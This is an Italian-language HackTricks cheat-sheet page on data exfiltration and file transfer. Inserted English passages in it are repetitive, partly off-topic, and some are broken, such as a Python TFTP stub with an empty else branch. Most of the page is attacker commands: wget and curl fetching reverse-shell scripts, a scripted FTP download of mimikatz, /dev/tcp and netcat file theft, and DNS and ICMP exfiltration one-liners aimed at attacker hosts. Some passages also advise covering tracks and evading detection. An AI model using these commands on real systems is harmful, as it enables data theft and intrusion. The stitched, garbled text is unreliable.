# Esfiltrazione

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trova le vulnerabilità più importanti in modo da poterle correggere più velocemente. Intruder traccia la tua superficie di attacco, esegue scansioni proattive delle minacce, trova problemi in tutta la tua infrastruttura tecnologica, dalle API alle applicazioni web e ai sistemi cloud. [**Provalo gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) oggi.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Domini comunemente autorizzati per esfiltrare informazioni

Controlla [https://lots-project.com/](https://lots-project.com/) per trovare i domini comunemente autorizzati che possono essere abusati

## Copia e incolla Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**

# Exfiltration

Exfiltration is the process of unauthorized data transfer from a target system to an external location controlled by an attacker. In the context of hacking, exfiltration is a crucial step to steal sensitive information or gain unauthorized access to a network.

## Techniques

### 1. File Transfer Protocol (FTP)

FTP is a standard network protocol used to transfer files between a client and a server on a computer network. Attackers can use FTP to exfiltrate data by connecting to an FTP server and uploading the stolen files.

### 2. Hypertext Transfer Protocol (HTTP)

HTTP is the protocol used for transmitting hypertext over the internet. Attackers can use HTTP to exfiltrate data by sending HTTP requests to a remote server, either by embedding the data in the request or by uploading files.

### 3. Domain Name System (DNS)

DNS is a hierarchical decentralized naming system for computers, services, or other resources connected to the internet. Attackers can use DNS exfiltration techniques to encode and send stolen data within DNS queries or responses.

### 4. Email

Attackers can exfiltrate data by sending it as email attachments or by using steganography techniques to hide the data within the email content.

### 5. Cloud Storage

Attackers can leverage cloud storage platforms to exfiltrate data by uploading the stolen files to cloud accounts under their control.

### 6. Remote Desktop Protocol (RDP)

RDP is a proprietary protocol developed by Microsoft that allows a user to connect to another computer over a network connection. Attackers can use RDP to exfiltrate data by transferring files or using remote desktop functionality to access and copy sensitive information.

### 7. USB Devices

Attackers can physically connect USB devices to a target system to exfiltrate data by copying files onto the device or using specialized tools to extract data from the system.

### 8. Covert Channels

Covert channels are hidden communication channels that can be used to exfiltrate data without being detected. Attackers can use techniques such as steganography, encryption, or tunneling protocols to establish covert channels for data exfiltration.

## Countermeasures

To prevent exfiltration attacks, it is important to implement the following countermeasures:

- Implement strong access controls and authentication mechanisms to prevent unauthorized access to sensitive data.
- Use encryption to protect data in transit and at rest.
- Monitor network traffic for suspicious activities and implement intrusion detection and prevention systems.
- Regularly update and patch software to fix vulnerabilities that could be exploited for exfiltration.
- Implement data loss prevention (DLP) solutions to detect and prevent unauthorized data transfers.
- Educate employees about the risks of exfiltration and implement security awareness training programs.

By implementing these countermeasures, organizations can significantly reduce the risk of data exfiltration and protect their sensitive information from falling into the wrong hands.
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**

### Exfiltrazione tramite HTTP

L'HTTP (Hypertext Transfer Protocol) è un protocollo di comunicazione utilizzato per il trasferimento di dati su Internet. Può essere sfruttato per esfiltrare dati sensibili da un sistema Linux.

#### Metodo 1: Utilizzo di cURL

cURL è uno strumento di linea di comando che consente di inviare richieste HTTP. Può essere utilizzato per eseguire una richiesta POST contenente i dati da esfiltrare.

```bash
$ curl -X POST -d "dati_da_esfiltrare" http://indirizzo_del_server
```

#### Metodo 2: Utilizzo di wget

wget è un altro strumento di linea di comando che consente di scaricare file da Internet. Può essere utilizzato per eseguire una richiesta GET contenente i dati da esfiltrare.

```bash
$ wget "http://indirizzo_del_server?dati_da_esfiltrare"
```

#### Metodo 3: Utilizzo di netcat

netcat è uno strumento di rete che consente di creare connessioni TCP o UDP. Può essere utilizzato per inviare i dati da esfiltrare a un server remoto.

```bash
$ echo "dati_da_esfiltrare" | nc indirizzo_del_server porta
```

#### Metodo 4: Utilizzo di Python

Python è un linguaggio di programmazione molto potente e flessibile. Può essere utilizzato per creare uno script personalizzato per eseguire l'esfiltrazione dei dati tramite HTTP.

```python
import requests

url = "http://indirizzo_del_server"
data = {"dati_da_esfiltrare": "valore"}

response = requests.post(url, data=data)
```

#### Metodo 5: Utilizzo di PowerShell

PowerShell è una shell di scripting e un linguaggio di programmazione sviluppato da Microsoft. Può essere utilizzato per eseguire richieste HTTP e inviare i dati da esfiltrare a un server remoto.

```powershell
$uri = "http://indirizzo_del_server"
$data = "dati_da_esfiltrare"

Invoke-WebRequest -Uri $uri -Method POST -Body $data
```

#### Metodo 6: Utilizzo di PHP

PHP è un linguaggio di scripting ampiamente utilizzato per lo sviluppo web. Può essere utilizzato per creare uno script personalizzato per eseguire l'esfiltrazione dei dati tramite HTTP.

```php
<?php
$url = "http://indirizzo_del_server";
$data = array("dati_da_esfiltrare" => "valore");

$options = array(
    "http" => array(
        "header"  => "Content-type: application/x-www-form-urlencoded\r\n",
        "method"  => "POST",
        "content" => http_build_query($data),
    ),
);

$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
?>
```

#### Metodo 7: Utilizzo di Ruby

Ruby è un linguaggio di programmazione dinamico, orientato agli oggetti e open source. Può essere utilizzato per creare uno script personalizzato per eseguire l'esfiltrazione dei dati tramite HTTP.

```ruby
require 'net/http'

url = URI.parse("http://indirizzo_del_server")
data = "dati_da_esfiltrare"

http = Net::HTTP.new(url.host, url.port)
request = Net::HTTP::Post.new(url.path)
request.body = data

response = http.request(request)
```
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**

# Exfiltration

Exfiltration is the process of unauthorized data transfer from a target system to an external location controlled by an attacker. In the context of hacking, exfiltration is a crucial step to steal sensitive information or gain unauthorized access to a network.

## Techniques

### 1. File Transfer Protocol (FTP)

FTP is a standard network protocol used to transfer files between a client and a server on a computer network. Attackers can exploit FTP vulnerabilities to exfiltrate data from a compromised Windows system.

### 2. Remote Desktop Protocol (RDP)

RDP is a proprietary protocol developed by Microsoft that allows users to connect to a remote computer over a network connection. Attackers can abuse RDP to gain unauthorized access to a Windows system and exfiltrate data.

### 3. Web-based Exfiltration

Attackers can use web-based exfiltration techniques to transfer data from a compromised Windows system to an external server. This can be done through various methods, such as uploading files to a cloud storage service or sending data via HTTP requests.

### 4. DNS Tunneling

DNS tunneling is a technique that allows attackers to bypass network security measures by encapsulating data within DNS queries and responses. Attackers can use DNS tunneling to exfiltrate data from a compromised Windows system without raising suspicion.

### 5. Steganography

Steganography is the practice of concealing data within another file or message to avoid detection. Attackers can use steganography techniques to hide exfiltrated data within innocent-looking files, such as images or documents.

## Countermeasures

To prevent exfiltration attacks on Windows systems, it is important to implement the following countermeasures:

- Regularly update and patch Windows systems to address known vulnerabilities.
- Implement strong access controls and authentication mechanisms to prevent unauthorized access to sensitive data.
- Use network monitoring tools to detect and block suspicious network traffic.
- Employ data loss prevention (DLP) solutions to monitor and prevent the unauthorized transfer of sensitive data.
- Educate users about the risks of phishing attacks and social engineering techniques that can lead to data exfiltration.

By implementing these countermeasures, organizations can significantly reduce the risk of data exfiltration and protect their sensitive information.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Caricare file

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer che stampa GET e POST (anche gli header)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Modulo Python [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **Server HTTPS**
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### Server FTP (python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### Server FTP (NodeJS)

#### Description

The FTP server is a NodeJS application that allows users to upload and download files using the FTP protocol. It provides a simple and convenient way to transfer files between a client and a server.

#### Vulnerability

The FTP server may have vulnerabilities that can be exploited by attackers to gain unauthorized access to the server or to exfiltrate sensitive data. Some common vulnerabilities include weak passwords, outdated software versions, and misconfigured permissions.

#### Exploitation

To exploit vulnerabilities in the FTP server, attackers can use various techniques such as brute-forcing passwords, exploiting known vulnerabilities in the FTP software, or leveraging misconfigured permissions to gain unauthorized access.

#### Mitigation

To mitigate the risks associated with the FTP server, it is important to follow security best practices. This includes using strong and unique passwords, keeping the software up to date with the latest security patches, and properly configuring permissions to restrict access to sensitive files.

#### References

- [NodeJS FTP Server Documentation](https://www.npmjs.com/package/ftp-server)
- [OWASP FTP Security Best Practices](https://owasp.org/www-community/vulnerabilities/FTP_Security_Cheat_Sheet)
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### Server FTP (pure-ftp)

#### Description

FTP (File Transfer Protocol) is a standard network protocol used for transferring files between a client and a server on a computer network. Pure-FTP is a popular FTP server software that provides a secure and efficient way to transfer files.

#### Exfiltration Methodology

1. Identify the target FTP server: Determine the IP address or domain name of the FTP server you want to exfiltrate data from.

2. Enumerate FTP server: Use tools like Nmap or Netcat to scan the target FTP server for open ports and services. Look for port 21, which is the default port for FTP.

3. Enumerate FTP users: Use tools like Nmap or Netcat to enumerate FTP users on the target server. This can help you identify valid usernames to use for authentication.

4. Brute-force FTP credentials: Use tools like Hydra or Medusa to perform brute-force attacks against the FTP server. Try common username and password combinations to gain unauthorized access.

5. Gain access to FTP server: Once you have valid FTP credentials, use an FTP client like FileZilla or WinSCP to connect to the FTP server and gain access to its file system.

6. Exfiltrate data: Navigate through the FTP server's file system and locate the files you want to exfiltrate. Use the FTP client to download these files to your local machine.

7. Cover your tracks: After exfiltrating the desired data, make sure to delete any traces of your activities on the FTP server. This can include deleting the downloaded files, clearing the FTP client's history, and removing any log files that may have been generated.

#### Countermeasures

To protect against FTP exfiltration attacks, consider implementing the following countermeasures:

- Use strong and unique passwords for FTP accounts.
- Enable FTP over TLS/SSL to encrypt data during transmission.
- Implement intrusion detection and prevention systems to detect and block suspicious FTP activities.
- Regularly monitor FTP server logs for any unauthorized access attempts.
- Limit the number of failed login attempts to prevent brute-force attacks.
- Keep the FTP server software up to date with the latest security patches.
- Consider using alternative file transfer methods, such as SFTP or SCP, which provide stronger security features.
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Client** Windows

Il client **Windows** è un sistema operativo ampiamente utilizzato che offre molte opportunità per l'esfiltrazione di dati. Di seguito sono riportate alcune tecniche comuni utilizzate per eseguire l'esfiltrazione dei dati da un client **Windows**.

#### **1. Utilizzo di strumenti di terze parti**

Esistono molti strumenti di terze parti disponibili per l'esfiltrazione dei dati da un client **Windows**. Questi strumenti possono essere utilizzati per copiare i dati su un server remoto o per inviare i dati tramite protocolli di rete come FTP, HTTP o SMTP.

#### **2. Utilizzo di script di PowerShell**

PowerShell è un potente strumento di scripting integrato in **Windows** che può essere utilizzato per eseguire l'esfiltrazione dei dati. Gli script di PowerShell possono essere utilizzati per copiare i dati su un server remoto, inviare i dati tramite protocolli di rete o crittografare i dati prima dell'esfiltrazione.

#### **3. Utilizzo di tunneling**

Il tunneling è una tecnica che consente di inviare dati attraverso un canale di comunicazione diverso da quello previsto. Ad esempio, è possibile utilizzare il tunneling per inviare dati attraverso il protocollo DNS o il protocollo ICMP.

#### **4. Utilizzo di servizi di cloud storage**

I servizi di cloud storage come **Dropbox**, **Google Drive** o **OneDrive** possono essere utilizzati per eseguire l'esfiltrazione dei dati da un client **Windows**. I dati possono essere caricati su questi servizi di cloud storage e successivamente scaricati su un altro dispositivo.

#### **5. Utilizzo di dispositivi di archiviazione esterni**

I dispositivi di archiviazione esterni come le chiavette USB o i dischi rigidi esterni possono essere utilizzati per copiare i dati da un client **Windows** e successivamente trasferirli su un altro dispositivo.

#### **6. Utilizzo di protocolli di rete non standard**

I protocolli di rete non standard possono essere utilizzati per eseguire l'esfiltrazione dei dati da un client **Windows**. Ad esempio, è possibile utilizzare un protocollo di rete personalizzato per inviare i dati a un server remoto.

#### **7. Utilizzo di canali nascosti**

I canali nascosti sono tecniche che consentono di nascondere i dati all'interno di file o comunicazioni apparentemente innocenti. Ad esempio, è possibile nascondere i dati all'interno di immagini o file audio.

#### **8. Utilizzo di malware**

Il malware può essere utilizzato per eseguire l'esfiltrazione dei dati da un client **Windows**. Il malware può essere progettato per copiare i dati su un server remoto o per inviare i dati tramite protocolli di rete.

Queste sono solo alcune delle tecniche comuni utilizzate per eseguire l'esfiltrazione dei dati da un client **Windows**. È importante tenere presente che l'esfiltrazione dei dati senza autorizzazione è un'attività illegale e può comportare conseguenze legali gravi.
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trova le vulnerabilità che contano di più in modo da poterle correggere più velocemente. Intruder traccia la tua superficie di attacco, esegue scansioni proattive delle minacce, trova problemi in tutta la tua infrastruttura tecnologica, dalle API alle applicazioni web e ai sistemi cloud. [**Provalo gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) oggi stesso.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## SMB

Kali come server
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
O crea una condivisione smb **utilizzando samba**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# Esfiltrazione dei dati in Windows

In Windows, ci sono diverse tecniche che possono essere utilizzate per esfiltrare dati da un sistema compromesso. Di seguito sono elencate alcune delle tecniche più comuni:

## Utilizzo di comandi di rete

I comandi di rete possono essere utilizzati per inviare dati da un sistema compromesso a un server remoto. Alcuni esempi di comandi di rete che possono essere utilizzati includono:

- `ping`: può essere utilizzato per inviare dati a un indirizzo IP specifico utilizzando il campo dati dei pacchetti ICMP.
- `nslookup`: può essere utilizzato per inviare dati a un server DNS specifico utilizzando il campo dati delle richieste DNS.
- `curl`: può essere utilizzato per inviare dati a un server web utilizzando richieste HTTP o HTTPS.

## Utilizzo di servizi di file hosting

I servizi di file hosting possono essere utilizzati per caricare file da un sistema compromesso e quindi scaricarli su un altro sistema. Alcuni esempi di servizi di file hosting includono:

- Dropbox
- Google Drive
- OneDrive

## Utilizzo di tunneling

Il tunneling può essere utilizzato per inviare dati da un sistema compromesso a un server remoto attraverso un canale crittografato. Alcuni esempi di strumenti di tunneling che possono essere utilizzati includono:

- SSH tunneling
- VPN tunneling

## Utilizzo di canali nascosti

I canali nascosti possono essere utilizzati per nascondere dati all'interno di file o comunicazioni apparentemente innocue. Alcuni esempi di tecniche di canale nascosto includono:

- Steganografia: nascondere dati all'interno di file multimediali come immagini o audio.
- Criptografia steganografica: nascondere dati all'interno di file crittografati.
- Tunneling HTTP: nascondere dati all'interno di richieste HTTP.

## Utilizzo di dispositivi di archiviazione esterni

I dispositivi di archiviazione esterni, come le chiavette USB o i dischi rigidi esterni, possono essere utilizzati per copiare dati da un sistema compromesso e quindi trasferirli su un altro sistema.

## Utilizzo di servizi di messaggistica

I servizi di messaggistica possono essere utilizzati per inviare dati da un sistema compromesso a un altro sistema. Alcuni esempi di servizi di messaggistica includono:

- Email
- Messaggistica istantanea (come WhatsApp o Telegram)
- Servizi di posta elettronica criptata (come ProtonMail)

Queste sono solo alcune delle tecniche di esfiltrazione dei dati che possono essere utilizzate in un ambiente Windows. È importante notare che l'utilizzo di queste tecniche per scopi illegali o non autorizzati è un reato.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

L'attaccante deve avere SSHd in esecuzione.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

Se la vittima ha SSH, l'attaccante può montare una directory dalla vittima all'attaccante.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC (Netcat) è uno strumento versatile per la comunicazione di rete che può essere utilizzato per l'esfiltrazione dei dati. Può essere utilizzato sia come client che come server per stabilire connessioni TCP o UDP e trasferire dati tra host.

Per esfiltrare dati utilizzando NC, è possibile utilizzare il seguente comando come server:

```
nc -l -p <port> > <output_file>
```

Questo comando avvierà un server NC in ascolto sulla porta specificata e i dati ricevuti saranno scritti nel file di output specificato.

Come client, è possibile utilizzare il seguente comando per inviare dati a un server NC:

```
nc <server_ip> <port> < <input_file>
```

Questo comando si connetterà al server NC specificato e invierà i dati dal file di input specificato.

NC può essere utilizzato anche per eseguire comandi remoti su un host e ottenere l'output. Ad esempio, è possibile utilizzare il seguente comando per eseguire un comando remoto su un host e salvare l'output in un file:

```
echo "<command>" | nc <host_ip> <port> > <output_file>
```

Questo comando invierà il comando specificato al server NC e salverà l'output nel file di output specificato.

NC è uno strumento potente per l'esfiltrazione dei dati e può essere utilizzato in vari scenari durante un test di penetrazione. Tuttavia, è importante utilizzarlo in modo responsabile e nel rispetto delle leggi e delle politiche applicabili.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
```bash
cat /path/to/file > /dev/tcp/attacker_ip/attacker_port
```

This method allows you to download a file from the victim machine to the attacker machine using the `/dev/tcp` device file. Replace `/path/to/file` with the path of the file you want to download, `attacker_ip` with the IP address of the attacker machine, and `attacker_port` with the port number on which the attacker machine is listening.

### Upload file to victim

```bash
cat /path/to/file | nc -l -p victim_port
```

This method allows you to upload a file from the attacker machine to the victim machine using the `nc` command. Replace `/path/to/file` with the path of the file you want to upload and `victim_port` with the port number on which the victim machine is listening.

### Exfiltrate data using DNS

```bash
base64 /path/to/file | xargs -I{} -n1 bash -c 'echo -n {}. | xxd -p | tr -d "\n" | sed "s/\(..\)/\1./g"; echo attacker_domain' | xargs -I{} -n1 dig +short {}.attacker_domain
```

This method allows you to exfiltrate data from the victim machine to the attacker machine using DNS requests. Replace `/path/to/file` with the path of the file you want to exfiltrate and `attacker_domain` with the domain name of the attacker machine.

### Exfiltrate data using ICMP

```bash
base64 /path/to/file | xargs -I{} -n1 bash -c 'echo -n {}. | xxd -p | tr -d "\n" | sed "s/\(..\)/\1 /g"; echo attacker_ip' | xargs -I{} -n1 ping -c 1 -p {} -s 0 attacker_ip
```

This method allows you to exfiltrate data from the victim machine to the attacker machine using ICMP packets. Replace `/path/to/file` with the path of the file you want to exfiltrate and `attacker_ip` with the IP address of the attacker machine.
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Caricare un file sulla vittima

To upload a file to the victim's system, you can use various methods depending on the access and privileges you have gained. Here are some common techniques:

#### 1. Web-based file upload

If the victim's system has a web application that allows file uploads, you can exploit this functionality to upload your file. Look for vulnerabilities such as insufficient file type validation, unrestricted file size, or inadequate file permissions. Craft a malicious file and upload it using the web interface.

#### 2. File transfer protocols

If you have access to the victim's system or network, you can use file transfer protocols like FTP (File Transfer Protocol), SFTP (Secure File Transfer Protocol), or SCP (Secure Copy) to transfer your file. These protocols require valid credentials or vulnerabilities in the configuration to exploit.

#### 3. Email attachments

If you have access to the victim's email account, you can send an email with the file attached. Craft a convincing email and make sure the victim opens the attachment. This method requires social engineering skills to trick the victim into opening the attachment.

#### 4. Cloud storage platforms

If the victim uses cloud storage platforms like Dropbox, Google Drive, or OneDrive, you can try to gain access to their account and upload your file. Look for vulnerabilities in the authentication process or weak passwords to exploit.

#### 5. Remote code execution

If you have gained remote code execution on the victim's system, you can use this access to upload your file. Exploit vulnerabilities in the system or application to execute arbitrary code and transfer your file to the desired location.

Remember to cover your tracks and avoid detection while uploading the file. Use encryption, obfuscation, or steganography techniques to hide the file and make it harder to detect.
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
Grazie a **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

Se puoi inviare dati a un server SMTP, puoi creare un server SMTP per ricevere i dati con python:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

Di default in XP e 2003 (in altri sistemi operativi deve essere esplicitamente aggiunto durante l'installazione)

In Kali, **avvia il server TFTP**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Server TFTP in python:**

```python
import socket
import struct

def tftp_server():
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', 69))

    while True:
        data, addr = sock.recvfrom(1024)
        opcode = struct.unpack('!H', data[:2])[0]

        if opcode == 1:  # Read request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            # Process the read request and send the file
            # ...

        elif opcode == 2:  # Write request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            # Process the write request and receive the file
            # ...

        else:
            # Invalid opcode
            # ...

if __name__ == '__main__':
    tftp_server()
```

This code snippet shows a simple TFTP (Trivial File Transfer Protocol) server implemented in Python. The server listens on port 69 and handles read and write requests from TFTP clients.

The server uses a UDP socket to receive data from clients. It binds to the IP address '0.0.0.0' and port 69, which is the default port for TFTP. 

The server enters a loop where it continuously waits for incoming data. When a packet is received, the server extracts the opcode from the packet header. The opcode indicates the type of request: 1 for read request (RRQ) and 2 for write request (WRQ).

If the opcode is 1, the server processes the read request by extracting the filename and mode from the packet. The server can then perform any necessary operations to retrieve the requested file and send it back to the client.

If the opcode is 2, the server processes the write request by extracting the filename and mode from the packet. The server can then perform any necessary operations to receive the file from the client and save it.

If the opcode is neither 1 nor 2, the server handles the invalid opcode accordingly.

The code snippet provides a basic structure for a TFTP server in Python. Additional functionality, such as error handling and security measures, can be added as needed.
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
In **vittima**, connettiti al server Kali:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Scarica un file con un oneliner PHP:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript (Visual Basic Scripting Edition) è un linguaggio di scripting basato su Visual Basic, utilizzato principalmente per l'automazione di attività su sistemi Windows. Può essere utilizzato anche per esfiltrare dati da un sistema compromesso.

### Esfiltrazione tramite VBScript

VBScript può essere utilizzato per esfiltrare dati da un sistema compromesso in diversi modi:

1. **Esfiltrazione tramite email**: VBScript può essere utilizzato per inviare dati sensibili tramite email. È possibile utilizzare la funzione `SendMail` per inviare un'email contenente i dati esfiltrati a un indirizzo specificato.

```vbscript
Set objEmail = CreateObject("CDO.Message")
objEmail.From = "mittente@example.com"
objEmail.To = "destinatario@example.com"
objEmail.Subject = "Dati esfiltrati"
objEmail.TextBody = "Questi sono i dati esfiltrati: <dati>"
objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.example.com"
objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25
objEmail.Configuration.Fields.Update
objEmail.Send
```

2. **Esfiltrazione tramite HTTP**: VBScript può essere utilizzato per inviare dati sensibili a un server remoto tramite una richiesta HTTP. È possibile utilizzare la funzione `WinHttp` per inviare una richiesta POST contenente i dati esfiltrati.

```vbscript
Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
objHTTP.Open "POST", "http://server.example.com/esfiltrazione", False
objHTTP.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
objHTTP.Send "dati=<dati>"
```

3. **Esfiltrazione tramite FTP**: VBScript può essere utilizzato per caricare dati sensibili su un server FTP remoto. È possibile utilizzare la funzione `FTP` per connettersi a un server FTP e caricare i dati esfiltrati.

```vbscript
Set objFTP = CreateObject("Microsoft.XMLHTTP")
objFTP.Open "PUT", "ftp://server.example.com/directory/dati.txt", False
objFTP.Send "<dati>"
```

4. **Esfiltrazione tramite cloud storage**: VBScript può essere utilizzato per caricare dati sensibili su un servizio di archiviazione cloud come Google Drive o Dropbox. È possibile utilizzare le API del servizio cloud per caricare i dati esfiltrati.

```vbscript
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile("C:\directory\dati.txt", True)
objFile.Write "<dati>"
objFile.Close

Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /c gdrive upload C:\directory\dati.txt"
```

### Conclusioni

VBScript può essere utilizzato per esfiltrare dati da un sistema compromesso in diversi modi, tra cui l'invio di email, l'invio di richieste HTTP, il caricamento su server FTP e l'utilizzo di servizi di archiviazione cloud. È importante comprendere queste tecniche per poterle rilevare e mitigare efficacemente durante un'attività di pentesting o di difesa delle infrastrutture.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Vittima**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
